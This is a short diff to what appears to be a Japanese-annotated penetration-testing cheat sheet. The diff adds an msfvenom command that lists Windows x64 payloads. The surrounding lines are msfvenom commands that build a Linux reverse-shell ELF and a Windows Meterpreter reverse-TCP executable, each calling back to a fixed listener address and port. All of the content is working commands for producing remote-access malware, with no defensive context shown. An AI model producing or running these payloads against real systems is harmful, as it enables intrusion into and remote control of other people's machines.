@@ -1,4 +1,7 @@
 ```sh
+# ペイロード検索
+msfvenom -l payloads --platform windows --arch x64
+
 msfvenom -p linux/shell_reverse_tcp lhost=192.168.0.1 lport=31337 -f elf -o exploit.elf
 
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.109.203 lport=1234 -f exe -o exploit.exe
